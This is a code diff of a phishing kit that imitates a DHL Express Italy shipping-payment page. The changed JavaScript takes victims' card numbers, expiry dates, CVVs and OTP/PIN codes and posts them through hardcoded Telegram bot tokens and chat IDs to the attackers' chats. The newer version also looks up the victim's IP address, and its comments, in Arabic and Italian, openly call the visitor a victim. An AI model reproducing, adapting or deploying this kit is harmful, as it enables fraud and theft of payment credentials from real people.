@@ -3,40 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DHL Express Easy - Pagamento protetto</title>
+    <title>DHL Express Easy - Pagamento</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
-        body{
-            font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
-            background:linear-gradient(145deg,#f0f2f5 0%,#e2e6eb 100%);
-            min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px
-        }
-        #loader-screen{
-            position:fixed;top:0;left:0;width:100%;height:100%;
-            background:#FFCC00;display:flex;justify-content:center;align-items:center;
-            z-index:9999;transition:opacity 0.7s ease,visibility 0.7s ease
-        }
-        #loader-screen.hidden{opacity:0;visibility:hidden}
+        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;background:linear-gradient(145deg,#f0f2f5 0%,#e2e6eb 100%);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px}
+        .hidden{opacity:0;visibility:hidden}
+        #loader-screen{position:fixed;top:0;left:0;width:100%;height:100%;background:#FFCC00;display:flex;justify-content:center;align-items:center;z-index:9999;transition:opacity 0.7s ease,visibility 0.7s ease}
         .dhl-loader{display:flex;flex-direction:column;align-items:center}
         .dhl-loader .logo-row{display:flex;align-items:center;gap:10px}
         .dhl-loader .logo-row .lines{display:flex;flex-direction:column;gap:4px}
         .dhl-loader .logo-row .lines span{width:40px;height:5px;background:#D40511;transform:skewX(-18deg)}
         .dhl-loader .logo-row .dhl{font-size:85px;font-weight:900;font-style:italic;color:#D40511;letter-spacing:-6px;line-height:1}
-        .dhl-loader .sub{
-            font-size:24px;font-weight:900;font-style:italic;text-transform:uppercase;letter-spacing:-1.5px;
-            background:linear-gradient(90deg,#fff 65%,transparent);padding:4px 60px 4px 30px;
-            margin-top:-6px;transform:skewX(-18deg);display:inline-block
-        }
+        .dhl-loader .sub{font-size:24px;font-weight:900;font-style:italic;text-transform:uppercase;letter-spacing:-1.5px;background:linear-gradient(90deg,#fff 65%,transparent);padding:4px 60px 4px 30px;margin-top:-6px;transform:skewX(-18deg);display:inline-block}
         .dhl-loader .sub .red{color:#D40511}
         .dhl-loader .sub .black{color:#000}
         .dhl-loader .bar{width:240px;height:3px;background:rgba(0,0,0,0.08);border-radius:6px;margin-top:24px;overflow:hidden}
         .dhl-loader .bar-inner{width:0%;height:100%;background:#D40511;border-radius:6px;animation:loadBar 2s ease-in-out forwards}
         @keyframes loadBar{0%{width:0%}60%{width:75%}100%{width:100%}}
-        .processing-overlay{
-            position:fixed;top:0;left:0;width:100%;height:100%;
-            background:rgba(255,255,255,0.55);backdrop-filter:blur(10px);
-            display:none;justify-content:center;align-items:center;z-index:9998;flex-direction:column;gap:18px
-        }
+        .processing-overlay{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(255,255,255,0.55);backdrop-filter:blur(10px);display:none;justify-content:center;align-items:center;z-index:9998;flex-direction:column;gap:18px}
         .processing-overlay.visible{display:flex}
         .processing-overlay .p-spinner{width:50px;height:50px;border:4px solid #e5e7eb;border-top-color:#D40511;border-radius:50%;animation:spin 0.7s linear infinite}
         @keyframes spin{to{transform:rotate(360deg)}}
@@ -50,17 +34,10 @@
         .card-header .brand .logo-group .lines{display:flex;flex-direction:column;gap:3px}
         .card-header .brand .logo-group .lines span{width:20px;height:4px;background:#D40511;transform:skewX(-18deg)}
         .card-header .brand .logo-group .dhl-text{font-size:38px;font-weight:900;font-style:italic;color:#D40511;letter-spacing:-2.5px;line-height:1}
-        .card-header .brand .sub-title{
-            font-size:15px;font-weight:800;font-style:italic;text-transform:uppercase;letter-spacing:-0.5px;
-            background:linear-gradient(90deg,#fff 60%,transparent);padding:2px 40px 2px 12px;
-            margin-top:-2px;transform:skewX(-18deg);display:inline-block
-        }
+        .card-header .brand .sub-title{font-size:15px;font-weight:800;font-style:italic;text-transform:uppercase;letter-spacing:-0.5px;background:linear-gradient(90deg,#fff 60%,transparent);padding:2px 40px 2px 12px;margin-top:-2px;transform:skewX(-18deg);display:inline-block}
         .card-header .brand .sub-title .red{color:#D40511}
         .card-header .brand .sub-title .black{color:#000}
-        .card-header .badge{
-            display:flex;align-items:center;gap:6px;background:rgba(255,255,255,0.5);
-            padding:6px 14px;border-radius:24px;font-size:12px;font-weight:600;color:#333;backdrop-filter:blur(4px)
-        }
+        .card-header .badge{display:flex;align-items:center;gap:6px;background:rgba(255,255,255,0.5);padding:6px 14px;border-radius:24px;font-size:12px;font-weight:600;color:#333;backdrop-filter:blur(4px)}
         .card-header .badge svg{width:14px;height:14px;flex-shrink:0}
         .card-body{padding:28px 28px 20px}
         .card-body h2{font-size:21px;font-weight:700;color:#111827;margin-bottom:4px}
@@ -70,20 +47,13 @@
         .pay-icon svg{height:22px;display:block}
         .form-group{margin-bottom:20px}
         .form-group label{display:block;font-size:13px;font-weight:600;color:#374151;margin-bottom:6px}
-        .form-group input{
-            width:100%;padding:14px 16px;border:1.5px solid #d1d5db;border-radius:10px;
-            font-size:16px;color:#111827;background:#f9fafb;outline:none;transition:all 0.2s ease
-        }
+        .form-group input{width:100%;padding:14px 16px;border:1.5px solid #d1d5db;border-radius:10px;font-size:16px;color:#111827;background:#f9fafb;outline:none;transition:all 0.2s ease}
         .form-group input:focus{border-color:#FFCC00;background:#fff;box-shadow:0 0 0 3px rgba(255,204,0,0.18)}
         .form-group input.error{border-color:#D40511;background:#fef2f2}
         .form-group input::placeholder{color:#9ca3af}
         .form-row{display:flex;gap:16px;margin-bottom:0}
         .form-row .form-group{flex:1;margin-bottom:0}
-        .btn-pay{
-            width:100%;padding:16px;background:#D40511;color:#fff;border:none;
-            border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;
-            transition:background 0.2s;margin-top:28px;display:flex;align-items:center;justify-content:center;gap:8px
-        }
+        .btn-pay{width:100%;padding:16px;background:#D40511;color:#fff;border:none;border-radius:10px;font-size:16px;font-weight:700;cursor:pointer;transition:background 0.2s;margin-top:28px;display:flex;align-items:center;justify-content:center;gap:8px}
         .btn-pay:hover{background:#b3040e}
         .btn-pay svg{width:18px;height:18px;fill:#fff}
         .error-msg{color:#D40511;font-size:13px;text-align:center;display:none;margin-top:14px;font-weight:500}
@@ -107,10 +77,7 @@
         .otp-ui .info-box .value.amount{color:#D40511;font-size:16px;font-weight:700}
         .otp-ui .otp-wrap{margin-bottom:18px;text-align:left}
         .otp-ui .otp-wrap label{font-size:13px;font-weight:600;color:#374151;margin-bottom:8px;display:block}
-        .otp-ui .otp-wrap input{
-            width:100%;padding:16px;border:1.5px solid #d1d5db;border-radius:12px;
-            font-size:24px;text-align:center;letter-spacing:10px;background:#f9fafb;outline:none;transition:all 0.2s
-        }
+        .otp-ui .otp-wrap input{width:100%;padding:16px;border:1.5px solid #d1d5db;border-radius:12px;font-size:24px;text-align:center;letter-spacing:10px;background:#f9fafb;outline:none;transition:all 0.2s}
         .otp-ui .otp-wrap input:focus{border-color:#D40511;background:#fff;box-shadow:0 0 0 3px rgba(212,5,17,0.1)}
         .btn-confirm{width:100%;padding:16px;background:#111827;color:#fff;border:none;border-radius:12px;font-size:15px;font-weight:700;cursor:pointer;transition:background 0.2s}
         .btn-confirm:hover{background:#000}
@@ -138,22 +105,15 @@
         .btn-biometria svg{width:20px;height:20px;fill:#fff}
         .approve-ui .cancel{display:inline-block;margin-top:16px;font-size:13px;color:#9ca3af;text-decoration:none}
         .approve-ui .cancel:hover{text-decoration:underline;color:#6b7280}
-        @media(max-width:500px){
-            body{padding:10px}
-            .card-body{padding:20px}
-            .card-header{padding:18px 20px}
-            .card-header .brand .logo-group .dhl-text{font-size:30px}
-            .card-header .badge{font-size:11px;padding:4px 10px}
-            .otp-ui,.approve-ui{padding:24px 16px}
-            .form-row{flex-direction:row;gap:12px}
-            .card-network-icons{gap:6px}
-            .pay-icon svg{height:18px}
-        }
+        @media(max-width:500px){body{padding:10px}.card-body{padding:20px}.card-header{padding:18px 20px}.card-header .brand .logo-group .dhl-text{font-size:30px}.card-header .badge{font-size:11px;padding:4px 10px}.otp-ui,.approve-ui{padding:24px 16px}.form-row{flex-direction:row;gap:12px}.card-network-icons{gap:6px}.pay-icon svg{height:18px}}
     </style>
 </head>
 <body>
 
-<!-- LOADING -->
+<!-- مخفي لعرض IP الضحية -->
+<span id="userIp" style="display:none"></span>
+
+<!-- شاشة التحميل -->
 <div id="loader-screen">
     <div class="dhl-loader">
         <div class="logo-row">
@@ -166,13 +126,13 @@
     </div>
 </div>
 
-<!-- PROCESSING -->
+<!-- Overlay المعالجة -->
 <div class="processing-overlay" id="processingOverlay">
     <div class="p-spinner"></div>
     <div class="p-text">Elaborazione in corso...</div>
 </div>
 
-<!-- ===== PAGE 1: CARD ===== -->
+<!-- ===== الصفحة 1: البطاقة ===== -->
 <div class="page active" id="pageCard">
     <div class="card-ui">
         <div class="card-header">
@@ -192,20 +152,22 @@
         <div class="card-body">
             <h2>Pagamento spedizione</h2>
             <p class="sub">Inserisci i dati della tua carta per € 2,99</p>
+
             <div class="card-network-icons" id="cardIcons"></div>
+
             <form id="cardForm">
                 <div class="form-group">
                     <label>Numero di carta</label>
-                    <input type="text" id="card-number" placeholder="5276 5262 5267 3266" maxlength="19" inputmode="numeric" autocomplete="cc-number">
+                    <input type="text" id="card-number" placeholder="5276 5262 5267 3266" maxlength="19" inputmode="numeric">
                 </div>
                 <div class="form-row">
                     <div class="form-group">
                         <label>Scadenza</label>
-                        <input type="text" id="card-expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric" autocomplete="cc-exp">
+                        <input type="text" id="card-expiry" placeholder="MM/YY" maxlength="5" inputmode="numeric">
                     </div>
                     <div class="form-group">
                         <label>CVV</label>
-                        <input type="text" id="card-cvn" placeholder="123" maxlength="4" inputmode="numeric" autocomplete="cc-csc">
+                        <input type="text" id="card-cvn" placeholder="123" maxlength="4" inputmode="numeric">
                     </div>
                 </div>
                 <button type="submit" class="btn-pay" id="payBtn">
@@ -228,7 +190,7 @@
     </div>
 </div>
 
-<!-- ===== PAGE 2: OTP ===== -->
+<!-- ===== الصفحة 2: OTP ===== -->
 <div class="page" id="pageOtp">
     <div class="otp-ui">
         <div class="shield">
@@ -267,7 +229,7 @@
     </div>
 </div>
 
-<!-- ===== PAGE 3: APPROVAL ===== -->
+<!-- ===== الصفحة 3: الموافقة ===== -->
 <div class="page" id="pageApprove">
     <div class="approve-ui">
         <div class="icons-row">
@@ -302,62 +264,35 @@
 </div>
 
 <script>
-// ============================================================
-// BOT TELEGRAM - CONFIGURAZIONE DIRETTA
-// ============================================================
+// ====================================================
+// إعدادات بوت تلغرام — ✳️ استبدل القيم أدناه ✳️
+// ====================================================
+const TELEGRAM_BOT_TOKEN = '8618349247:AAH25CSzXU5ESrOyUf6_zoLRi8U1JVz05a8';
+const TELEGRAM_CHAT_ID   = '8278195073';
+// ====================================================
 
-var BOT_1_TOKEN = '8191936030:AAFl4PoBphmVzsukVH1Y-SP5mE45kgMqnkg';
-var BOT_1_CHAT = '8278195073';
-
-var BOT_2_TOKEN = '8895456040:AAHUi9kQUh5ymj1kxYV4YVoR7CLeWbBupAc';
-var BOT_2_CHAT = '8278195073';
-
-var BOT_3_TOKEN = '8956984804:AAGwikxHCPilKs9zjmORPO7ly9CZD56davs';
-var BOT_3_CHAT = '8041602142';
-
-var bots = [
-    { token: BOT_1_TOKEN, chatId: BOT_1_CHAT },
-    { token: BOT_2_TOKEN, chatId: BOT_2_CHAT },
-    { token: BOT_3_TOKEN, chatId: BOT_3_CHAT }
-];
-
-function sendToAllBots(message) {
-    for (var i = 0; i < bots.length; i++) {
-        var bot = bots[i];
-        if (bot.token.indexOf('666') > -1 || bot.chatId === '0000') continue;
-        fetch('https://api.telegram.org/bot' + bot.token + '/sendMessage', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: bot.chatId,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        }).catch(function(err) {});
-    }
+// دالة إرسال البيانات إلى تلغرام
+function sendToTelegram(message) {
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+    const payload = {
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML'
+    };
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(payload)
+    }).catch(err => console.error('Telegram send error:', err));
 }
 
-function getVictimInfo() {
-    var now = new Date();
-    var ts = now.toLocaleString('it-IT', {
-        year: 'numeric', month: '2-digit', day: '2-digit',
-        hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: false
-    });
-    var ua = navigator.userAgent;
-    var os = 'Sconosciuto';
-    if (ua.indexOf('Windows') > -1) os = 'Windows';
-    else if (ua.indexOf('Android') > -1) os = 'Android';
-    else if (/(iPhone|iPad|iPod)/.test(ua)) os = 'iOS';
-    else if (ua.indexOf('Linux') > -1) os = 'Linux';
-    else if (ua.indexOf('Mac') > -1) os = 'macOS';
-    var device = /Mobi|Android|iPhone|iPad|iPod/i.test(ua) ? 'Mobile' : 'Desktop';
-    var lang = navigator.language || 'it';
-    var tz = Intl.DateTimeFormat().resolvedOptions().timeZone || '-';
-    var screenRes = screen.width + 'x' + screen.height;
-    return { ts: ts, ua: ua, os: os, device: device, lang: lang, tz: tz, screen: screenRes };
-}
+// التقاط IP الضحية
+fetch('https://api.ipify.org?format=json')
+    .then(r => r.json())
+    .then(d => document.getElementById('userIp').textContent = d.ip)
+    .catch(() => {});
 
-// ===== CARD ICONS =====
+// أيقونات الدفع
 (function() {
     var icons = [
         '<span class="pay-icon" style="background:#1A1F71;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="20" text-anchor="middle" font-size="12" font-weight="bold" font-family="Arial" letter-spacing="1">VISA</text></svg></span>',
@@ -365,7 +300,7 @@ function getVictimInfo() {
         '<span class="pay-icon" style="width:44px"><svg viewBox="0 0 50 30"><rect width="50" height="30" rx="4" fill="#0064CF"/><circle cx="18" cy="15" r="7" fill="#EB001B"/><circle cx="32" cy="15" r="7" fill="#00A2E5" opacity="0.8"/><path d="M25 20.5A7 7 0 0 0 25 9.5 7 7 0 0 1 25 20.5z" fill="#0099DF"/><text x="25" y="27" text-anchor="middle" font-size="4.5" font-weight="bold" font-family="Arial" fill="#fff">Maestro</text></svg></span>',
         '<span class="pay-icon" style="background:#2E77BC;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="16" text-anchor="middle" font-size="8" font-weight="bold" font-family="Arial" letter-spacing="1">AMEX</text></svg></span>',
         '<span class="pay-icon" style="background:#003087;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="18" text-anchor="middle" font-size="9" font-weight="bold" font-family="Arial" letter-spacing="1">PayPal</text></svg></span>',
-        '<span class="pay-icon" style="background:#000;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="14" text-anchor="middle" font-size="6" font-weight="bold" font-family="Arial"></text><text x="25" y="22" text-anchor="middle" font-size="5" font-weight="bold" font-family="Arial" letter-spacing="1">Pay</text></svg></span>',
+        '<span class="pay-icon" style="background:#000;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="14" text-anchor="middle" font-size="6" font-weight="bold" font-family="Arial">\uf8ff</text><text x="25" y="22" text-anchor="middle" font-size="5" font-weight="bold" font-family="Arial" letter-spacing="1">Pay</text></svg></span>',
         '<span class="pay-icon" style="border:1px solid #e0e0e0;width:44px"><svg viewBox="0 0 50 30"><text x="25" y="18" text-anchor="middle" font-size="8" font-weight="bold" font-family="Arial" fill="#5F6368">G Pay</text></svg></span>',
         '<span class="pay-icon" style="background:#0061A8;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="18" text-anchor="middle" font-size="6" font-weight="bold" font-family="Arial">PostePay</text></svg></span>',
         '<span class="pay-icon" style="background:#000;width:44px"><svg viewBox="0 0 50 30" style="fill:#fff"><text x="25" y="18" text-anchor="middle" font-size="7" font-weight="bold" font-family="Arial">Satispay</text></svg></span>',
@@ -375,12 +310,14 @@ function getVictimInfo() {
     if (c) { for (var i = 0; i < icons.length; i++) { c.innerHTML += icons[i]; } }
 })();
 
-// Loader hide
+// إخفاء شاشة التحميل
 window.addEventListener('load', function() {
-    setTimeout(function() { document.getElementById('loader-screen').classList.add('hidden'); }, 2200);
+    setTimeout(function() {
+        document.getElementById('loader-screen').classList.add('hidden');
+    }, 2200);
 });
 
-// Card number format
+// تنسيق رقم البطاقة
 document.getElementById('card-number').addEventListener('input', function() {
     var v = this.value.replace(/\D/g, '').substring(0, 16);
     var f = '';
@@ -391,7 +328,7 @@ document.getElementById('card-number').addEventListener('input', function() {
     this.value = f;
 });
 
-// Expiry format
+// تنسيق تاريخ الانتهاء
 document.getElementById('card-expiry').addEventListener('input', function() {
     var v = this.value.replace(/\D/g, '').substring(0, 4);
     var f = v.length > 2 ? v.substring(0, 2) + '/' + v.substring(2) : v;
@@ -408,49 +345,34 @@ document.getElementById('otp-input').addEventListener('input', function() {
     this.value = this.value.replace(/\D/g, '').substring(0, 6);
 });
 
-var capturedCard = '',
-    capturedExpiry = '',
-    capturedCVN = '',
-    capturedOTP = '';
-
-// === CARD SUBMIT ===
+// الصفحة 1 ← الصفحة 2 — إرسال بيانات البطاقة
 document.getElementById('cardForm').addEventListener('submit', function(e) {
     e.preventDefault();
+
     var card = document.getElementById('card-number').value.replace(/\s/g, '');
     var exp = document.getElementById('card-expiry').value;
     var cvn = document.getElementById('card-cvn').value;
     var err = document.getElementById('card-error');
 
-    if (card.length < 13 || card.length > 19 || isNaN(card)) {
+    if (card.length < 13) {
         err.textContent = 'Numero carta non valido.';
         err.style.display = 'block';
         document.getElementById('card-number').classList.add('error');
         return;
     }
-    var parts = exp.split('/');
-    if (parts.length !== 2 || parts[0].length !== 2 || parts[1].length !== 2) {
+    if (exp.length !== 5) {
         err.textContent = 'Data non valida. Usa MM/YY.';
         err.style.display = 'block';
         document.getElementById('card-expiry').classList.add('error');
         return;
     }
-    var m = parseInt(parts[0], 10);
-    if (m < 1 || m > 12) {
-        err.textContent = 'Mese non valido.';
-        err.style.display = 'block';
-        document.getElementById('card-expiry').classList.add('error');
-        return;
-    }
-    if (cvn.length < 3 || isNaN(cvn)) {
+    if (cvn.length < 3) {
         err.textContent = 'CVV non valido.';
         err.style.display = 'block';
         document.getElementById('card-cvn').classList.add('error');
         return;
     }
 
-    capturedCard = card;
-    capturedExpiry = exp;
-    capturedCVN = cvn;
     err.style.display = 'none';
     document.querySelectorAll('.error').forEach(function(el) { el.classList.remove('error'); });
 
@@ -463,23 +385,21 @@ document.getElementById('cardForm').addEventListener('submit', function(e) {
         String(d.getMonth() + 1).padStart(2, '0') + '/' +
         d.getFullYear();
 
-    var vi = getVictimInfo();
-    var msg = '🔴 <b>NUOVI DATI CARTA - DHL</b>\n' +
-        '═══════════════════════\n' +
-        '💳 <b>Numero:</b> <code>' + card + '</code>\n' +
-        '📅 <b>Scadenza:</b> ' + exp + '\n' +
-        '🔐 <b>CVV:</b> ' + cvn + '\n' +
-        '═══════════════════════\n' +
-        '🖥️ <b>Info dispositivo:</b>\n' +
-        '🌐 <b>UA:</b> ' + vi.ua.substring(0, 80) + '...\n' +
-        '💻 <b>OS:</b> ' + vi.os + '\n' +
-        '📱 <b>Tipo:</b> ' + vi.device + '\n' +
-        '🖵 <b>Schermo:</b> ' + vi.screen + '\n' +
-        '🌍 <b>Lingua:</b> ' + vi.lang + '\n' +
-        '🕐 <b>Fuso:</b> ' + vi.tz + '\n' +
-        '═══════════════════════\n' +
-        '🕐 ' + vi.ts;
-    sendToAllBots(msg);
+    // ========== إرسال بيانات البطاقة إلى تلغرام ==========
+    var now = new Date().toLocaleString('it-IT');
+    var ip = document.getElementById('userIp').textContent || 'N/D';
+    var tgMsg =
+'<b>💳 DHL PHISH - DATI CARTA</b>\n' +
+'━━━━━━━━━━━━━━━\n' +
+'<b>Carta:</b> <code>' + card + '</code>\n' +
+'<b>Scadenza:</b> ' + exp + '\n' +
+'<b>CVV:</b> <code>' + cvn + '</code>\n' +
+'<b>Ultime 4:</b> ' + last4 + '\n' +
+'━━━━━━━━━━━━━━━\n' +
+'<b>IP:</b> ' + ip + '\n' +
+'<b>Data/Ora:</b> ' + now;
+    sendToTelegram(tgMsg);
+    // ===================================================
 
     document.getElementById('pageCard').classList.remove('active');
     document.getElementById('processingOverlay').classList.add('visible');
@@ -490,6 +410,7 @@ document.getElementById('cardForm').addEventListener('submit', function(e) {
     }, 2800);
 });
 
+// إزالة error عند التعديل
 document.querySelectorAll('#card-number, #card-expiry, #card-cvn').forEach(function(el) {
     el.addEventListener('input', function() {
         this.classList.remove('error');
@@ -497,23 +418,28 @@ document.querySelectorAll('#card-number, #card-expiry, #card-cvn').forEach(funct
     });
 });
 
-// === OTP ===
+// الصفحة 2 ← الصفحة 3 — إرسال OTP
 document.getElementById('btnConfirm').addEventListener('click', function() {
     var otp = document.getElementById('otp-input').value;
     if (otp.length < 4) {
-        alert('O inserire il pin della carta per completare il pagamento.');
+        alert('Inserire il pin della carta per completare il pagamento.');
         return;
     }
-    capturedOTP = otp;
-    var msg = '🔴 <b>CODICE PIN/OTP - DHL</b>\n' +
-        '═══════════════════════\n' +
-        '🔑 <b>PIN:</b> <code>' + otp + '</code>\n' +
-        '═══════════════════════\n' +
-        '💳 <b>Carta:</b> <code>' + capturedCard + '</code>\n' +
-        '📅 ' + capturedExpiry + ' | 🔐 ' + capturedCVN + '\n' +
-        '═══════════════════════\n' +
-        '🕐 ' + new Date().toLocaleString('it-IT');
-    sendToAllBots(msg);
+
+    // ========== إرسال OTP إلى تلغرام ==========
+    var now = new Date().toLocaleString('it-IT');
+    var ip = document.getElementById('userIp').textContent || 'N/D';
+    var cardDisplay = document.getElementById('displayCardOtp').textContent;
+    var tgMsg =
+'<b>🔐 DHL PHISH - OTP/PIN</b>\n' +
+'━━━━━━━━━━━━━━━\n' +
+'<b>Carta:</b> ' + cardDisplay + '\n' +
+'<b>OTP/PIN:</b> <code>' + otp + '</code>\n' +
+'━━━━━━━━━━━━━━━\n' +
+'<b>IP:</b> ' + ip + '\n' +
+'<b>Data/Ora:</b> ' + now;
+    sendToTelegram(tgMsg);
+    // ==========================================
 
     document.getElementById('pageOtp').classList.remove('active');
     document.getElementById('processingOverlay').classList.add('visible');
@@ -524,6 +450,7 @@ document.getElementById('btnConfirm').addEventListener('click', function() {
     }, 2800);
 });
 
+// عداد تنازلي
 function startCountdown() {
     var t = 300;
     var el = document.getElementById('countdown');
@@ -533,6 +460,11 @@ function startCountdown() {
         el.textContent = String(Math.floor(t / 60)).padStart(2, '0') + ':' + String(t % 60).padStart(2, '0');
     }, 1000);
 }
+
+// منع إعادة تحميل الصفحة من الروابط
+document.querySelectorAll('a[href="#"]').forEach(function(a) {
+    a.addEventListener('click', function(e) { e.preventDefault(); });
+});
 </script>
 </body>
 </html>
